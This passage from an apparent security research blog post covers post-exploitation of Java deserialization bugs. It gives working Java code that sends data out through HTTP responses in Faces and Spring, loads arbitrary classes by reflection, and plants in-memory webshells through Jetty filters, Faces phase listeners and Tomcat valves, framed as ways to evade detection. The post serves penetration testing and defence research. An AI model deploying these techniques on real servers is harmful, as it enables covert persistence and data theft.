  // [...]
  /**
  * <p class="changed_modified_2_0">Return the {@link FacesContext}
  * instance for the request that is being processed by the current
  * thread.  If called during application initialization or shutdown,
  // [...]
  */
  public static FacesContext getCurrentInstance() {
  FacesContext facesContext = instance.get();
  
  if (null == facesContext) {
  facesContext = (FacesContext)threadInitContext.get(Thread.currentThread());
  }
  // Bug 20458755: If not found in the threadInitContext, use
  // a special FacesContextFactory implementation that knows how to
  // use the initContextServletContext map to obtain current ServletContext
  // out of thin air (actually, using the current ClassLoader), and use it 
  // to obtain the init FacesContext corresponding to that ServletContext.  
  if (null == facesContext) {
  // [...]
  FacesContextFactory privateFacesContextFactory = (FacesContextFactory) FactoryFinder.getFactory("com.sun.faces.ServletContextFacesContextFactory");
  if (null != privateFacesContextFactory) {
  facesContext = privateFacesContextFactory.getFacesContext(null, null, null, null);
  }
  }
  return facesContext;
  }
  // [...]

From this instance, the HTTP request and its response can be obtained from the [ExternalContext](https://docs.oracle.com/cd/E17802_01/j2ee/j2ee/javaserverfaces/1.2/docs/api/javax/faces/context/ExternalContext.html) using `getRequest` and `getResponse` methods:
  
  
  HttpServletRequest req = ((HttpServletRequest) FacesContext.getCurrentInstance()
  .getExternalContext().getRequest());
  System.out.println(req.getParameter("get_param"));
  
  HttpServletResponse resp = ((HttpServletResponse) FacesContext.getCurrentInstance()
  .getExternalContext().getResponse());
  resp.getWriter().write("Response!");

The request and response types could vary if `Portlet` is used instead of `Servlet` for Faces.

However, if these methods are called from a class loaded within the main `ClassLoader`, or a `ClassLoader` different from the current thread context's class loader, an exception will be thrown. The easiest way to interact with Faces is to actually load a new class using the current thread context's `ClassLoader`:
  
  
  byte[] classBytes = new byte[]{/* [...] */};
  Method method = classLoader.loadClass("java.lang.ClassLoader")
  .getDeclaredMethod("defineClass", String.class, byte[].class, Integer.class, Integer.class);
  method.setAccessible(true);
  ((Class) method.invoke(Thread.currentThread().getContextClassLoader(), 
  className, classBytes, 0, classBytes.length)
  ).newInstance();

Another option would be to lookup classes and invoke methods manually by querying the current thread context's `ClassLoader`:
  
  
  Class klass = Thread.currentThread().getContextClassLoader().loadClass("javax.faces.context.FacesContext")
  Object instance = klass.getMethod("getCurrentInstance", new Class[0])
  .invoke(null null);
  // [...]

Finally, it should be noted that the same static method seems to [exist](https://github.com/eclipse-ee4j/mojarra/blob/master/impl/src/main/java/jakarta/faces/context/FacesContext.java#L851) on [Mojarra Faces](https://github.com/eclipse-ee4j/mojarra), so exfiltrating data this way should also work on this web framework, as long as the right package is used.

### In Spring

As for Faces, a [static method](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/context/request/RequestContextHolder.html#currentRequestAttributes\(\)) in [Spring](https://github.com/spring-projects/spring-framework/blob/main/spring-web/src/main/java/org/springframework/web/context/request/RequestContextHolder.java#L124) automatically looks up the current state of the application from `ThreadLocals`:
  
  
  // spring-web/src/main/java/org/springframework/web/context/request/RequestContextHolder.java
  // [...]
  /**
  * Return the RequestAttributes currently bound to the thread.
  * <p>Exposes the previously bound RequestAttributes instance, if any.
  * Falls back to the current JSF FacesContext, if any.
  // [...]
  * is bound to the current thread
  * @see #setRequestAttributes
  * @see ServletRequestAttributes
  * @see FacesRequestAttributes
  * @see jakarta.faces.context.FacesContext#getCurrentInstance()
  */
  public static RequestAttributes currentRequestAttributes() throws IllegalStateException {
  RequestAttributes attributes = getRequestAttributes();
  if (attributes == null) {
  if (jsfPresent) {
  attributes = FacesRequestAttributesFactory.getFacesRequestAttributes();
  }
  if (attributes == null) {
  throw new IllegalStateException("No thread-bound request found: " +
  // [...]
  "In this case, use RequestContextListener or RequestContextFilter to expose the current request.");
  }
  }
  return attributes;
  }
  // [...]

The HTTP request and its response can be obtained from an instance of a class extending `RequestAttributes`. For `Servlet`, the `getRequest` and `getResponse` methods of the `ServletRequestAttributes` class should be used:
  
  
  ServletRequestAttributes reqAttributes = (ServletRequestAttributes)RequestContextHolder
  .currentRequestAttributes();
  System.out.println(reqAttributes.getRequest()
  .getParameter("get_param"));
  PrintWriter writer = reqAttributes.getResponse()
  .getWriter();
  writer.println("Result");
  writer.flush();

## Hijacking HTTP flows

The next step when exploiting arbitrary deserialization vulnerabilities when network traffic is filtered, could be to hijack the HTTP flows. This can be useful to persist at runtime and to only exploit the vulnerability once, by deploying in-memory webshells, even for environments that do not have JSP (Java Server Pages) files parsers.

As for exfiltrating data, the following web environments could be targeted:

  * Javax Faces
  * Spring with Tomcat embedded
  * Spring with Jetty

Some techniques against Embedded Tomcat are already covered in [this interesting article](https://xz.aliyun.com/t/7388) and in the [ysomap](https://github.com/wh1t3p1g/ysomap) tool. The following chapters will demonstrate a first method that can be used against Spring with Jetty, another one against Javax Faces, and a third one targeting Spring with Tomcat using Valves.

### On Spring with Jetty using Filters

In Jetty, the main web service has its context managed by the `WebAppContext` class. However, from `ThreadLocals`, only an instance to [its enclosed class](https://github.com/eclipse/jetty.project/blob/7a7d69a69f4f51772e20813332291189a24e91b1/jetty-webapp/src/main/java/org/eclipse/jetty/webapp/WebAppContext.java#L1412) `Context` can be obtained from the `RequestContextHolder` class mentioned before:
  
  
  WebAppContext.Context ctx = (WebAppContext.Context) (
  (ServletRequestAttributes)RequestContextHolder
  .currentRequestAttributes()
  ).getRequest().getServletContext();

In Java, a non-static enclosed class holds an instance of their enclosing class. Internally, a private field named `this$0` is used to store this instance. In order to obtain an instance of `WebAppContext`, the following Java snippet can be used:
  
  
  WebAppContext.Context ctx = (WebAppContext.Context) (
  (ServletRequestAttributes)RequestContextHolder
  .currentRequestAttributes()
  ).getRequest().getServletContext();
  Field this0 = ctx.getClass().getDeclaredField("this$0");
  this0.setAccessible(true);
  WebAppContext appCtx = (WebAppContext)this0.get(ctx);

From there, custom filters can be defined on the running application in order to intercept requests:
  
  
  WebAppContext.Context ctx = (WebAppContext.Context) (
  (ServletRequestAttributes)RequestContextHolder
  .currentRequestAttributes()
  ).getRequest().getServletContext();
  Field this0 = ctx.getClass().getDeclaredField("this$0");
  this0.setAccessible(true);
  WebAppContext appCtx = (WebAppContext)this0.get(ctx);
  
  Set<DispatcherType> set = new HashSet<DispatcherType>();
  appCtx.addFilter(new FilterHolder(new Filter() {
  @Override
  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
  if(!(servletRequest instanceof HttpServletRequest)) {
  filterChain.doFilter(servletRequest, servletResponse);
  return;
  }
  if(((HttpServletRequest) servletRequest).getHeader("req_header") != null) {
  servletResponse.getWriter().write(((HttpServletRequest) servletRequest).getHeader("req_header") );
  ((HttpServletResponse)servletResponse).getWriter().append("Result");
  }
  filterChain.doFilter(servletRequest, servletResponse);
  }
  }), "/*", EnumSet.of(DispatcherType.ASYNC, DispatcherType.REQUEST, DispatcherType.FORWARD));

This could serve as a basis for in-memory webshells against Spring using Jetty. However, as for Embedded Tomcat, more work is required in order to put this filter in the top of the filter chain to intercept unauthenticated requests, depending on the targeted application.

### On Javax Faces using Phases

Requests can be intercepted in Faces by using [PhaseListeners](https://docs.oracle.com/javaee%2F6%2Fapi%2F%2F/javax/faces/event/PhaseListener.html). They can be attached like Filters on Jetty or Tomcat, to the underlying web framework.

A custom `PhaseListener` is structured as follows:
  
  
  public class CustomPhase implements PhaseListener {
  
  @Override
  public void afterPhase(PhaseEvent phaseEvent) {
  try {
  Map<String, Object> cookies = FacesContext.getCurrentInstance().getExternalContext()
  .getRequestCookieMap();
  if (!cookies.containsKey("test"))
  return;
  Cookie cookie = (Cookie) cookies.get("test");
  // [...]
  HttpServletResponse resp = ((HttpServletResponse) FacesContext.getCurrentInstance()
  .getExternalContext().getResponse());
  resp.getWriter().write("Result");
  }catch(Throwable tr) {
  // ignored
  }
  }
  
  @Override
  public void beforePhase(PhaseEvent phaseEvent) {
  }
  
  @Override
  public PhaseId getPhaseId() {
  return PhaseId.RENDER_RESPONSE;
  }
  }
  

Once the class defined at runtime has been loaded using the current thread context's `ClassLoader`, the new `Phase` can be registered to intercept requests:
  
  
  LifecycleFactory lifecycleFactory = (LifecycleFactory) FactoryFinder
  .getFactory(FactoryFinder.LIFECYCLE_FACTORY);
  Lifecycle applicationLifecycle = lifecycleFactory
  .getLifecycle(LifecycleFactory.DEFAULT_LIFECYCLE);
  
  applicationLifecycle.addPhaseListener(new CustomPhase());
  

Finally, more work could be required to actually make it really intercept any request. Additionally, it could serve as a basis for in-memory webshells.

### On Spring with Tomcat using Valves

In Tomcat, [Valves](https://tomcat.apache.org/tomcat-6.0-doc/api/org/apache/catalina/Valve.html) can also be registered instead of Filters. These Valves were actually used to override a parameter that was rendered using JSP (Java Server Pages) to exploit the [Spring4Shell](https://www.trendmicro.com/en_fi/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html) vulnerability.

In pure Java, they can be registered as follows:
  
  
  WebappClassLoaderBase lbase = ((WebappClassLoaderBase)(
  (
  (ServletRequestAttributes)RequestContextHolder
  .getRequestAttributes()
  ).getRequest().getServletContext().getClassLoader())
  );
  
  Field fResources = getField(lbase.getClass(), "resources");
  fResources.setAccessible(true);
  StandardContext ctx = (StandardContext) ((WebResourceRoot)fResources.get(lbase))
  .getContext();
  
  ctx.getParent().getPipeline().addValve(new ValveBase() {
  @Override
  public void invoke(Request request, Response response) throws IOException, ServletException {
  // [...]
  // Intercept it
  // [...]
  if(this.getNext() != null) {
  this.getNext().invoke(request, response);
  }
  }
  });

## Conclusion

The tricks presented in this blogpost could be adapted to stay under the radar during engagements. Relying solely on EDRs and WAFs could make exploitation steps harder, but will never replace patching the vulnerable applications.

Some of the payloads mentioned here for Translets and Transformers are included in our [GitHub fork](https://github.com/synacktiv/ysoserial) or in [this pull request](https://github.com/frohoff/ysoserial/pull/219) to ysoserial's repository.

Note however that the gadget chains and vulnerable dependencies mentioned here are becoming fewer and fewer available on vulnerable applications. These tricks may therefore not be applicable as-is. Moreover, internal `Translets` will not be available from unnamed modules starting from Java 16, thus killing several gadget chains relying on it. We stay nonetheless confident that we will still find applications running on Java 7, 8 or 11 over the next years :)

Additionally, the same logic mentioned here to inject in-memory webshells could be exploited from other types of vulnerabilities leading to RCE (e.g. SSTI and scripting engines).

Finally, we tried to highlight some of the environment limitations mentioned here by creating a crypto/web challenge for [Hexacon](https://www.hexacon.fr/), named [AlmostIsoSerial](https://2023.hexacon.fr/challenge/#challenge-statement) ([sources.7z](https://challenge.hexacon.fr/2023/web/sources.7z), [vm.7z](https://challenge.hexacon.fr/2023/web/vm.7z)). You can find write-ups [here](https://2023.hexacon.fr/challenge/#challenge-writeups).

Share this article
